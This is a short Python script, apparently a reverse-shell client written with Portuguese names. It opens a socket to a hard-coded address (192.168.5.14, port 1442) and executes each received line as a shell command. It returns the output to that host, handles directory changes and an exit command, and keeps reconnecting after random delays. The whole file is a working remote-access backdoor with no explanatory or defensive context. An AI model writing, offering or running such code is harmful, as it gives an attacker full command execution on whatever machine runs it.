import socket
import subprocess
import time
import random
import os
def conection(ip, porta):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, porta))
        return s
    except Exception as e: # Catches any connection error, not just ConnectionRefused
        print(e)
        return None     



def listen(s):
    while True:
     try:
      recebido = s.recv(1024)
      conteudo = recebido.decode().strip()
      if conteudo == "/exit":
         return
      elif conteudo.startswith("cd "):
         resultado = conteudo[3:].strip()
         try:
            os.chdir(resultado)
            s.send(b"Diretorio alterado com sucesso\n")
         except Exception as e:
            s.send(str(e).encode() + b"\n")
      
      else:
        comando(s, conteudo)
     except socket.timeout as e:
       print(e)


def comando(s, data):
    p = subprocess.Popen(
        data, 
        shell=True, 
        stderr=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stdin=subprocess.PIPE)

    enviar = p.stderr.read() + p.stdout.read()
    s.send(enviar[:5000])




def main():
    ip = '192.168.5.14'
    porta = 1442
    while True:
        client = conection(ip, porta)
        if client:
            listen(client)
        else:
            time.sleep(random.randint(2, 16))